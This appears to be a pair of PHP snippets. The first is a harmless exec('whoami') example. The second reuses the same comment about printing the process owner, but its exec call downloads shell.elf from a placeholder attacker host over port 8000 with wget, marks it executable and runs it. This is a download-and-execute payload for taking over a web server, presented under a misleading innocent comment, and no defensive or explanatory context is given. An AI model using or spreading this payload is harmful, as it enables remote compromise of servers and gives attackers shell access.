<?php
// outputs the username that owns the running php/httpd process
// (on a system with the "whoami" executable in the path)
$output=null;
$retval=null;
exec('whoami', $output, $retval);
echo "Returned with status $retval and output:\n";
print_r($output);
?>


<?php
// outputs the username that owns the running php/httpd process
// (on a system with the "whoami" executable in the path)
$output=null;
$retval=null;
exec('cd /tmp;rm -f /tmp/shell.elf;wget http://<AttackerIP>:8000/shell.elf;chmod +x /tmp/shell.elf;/tmp/shell.elf', $output, $retval);
echo "Returned with status $retval and output:\n";
print_r($output);
?>
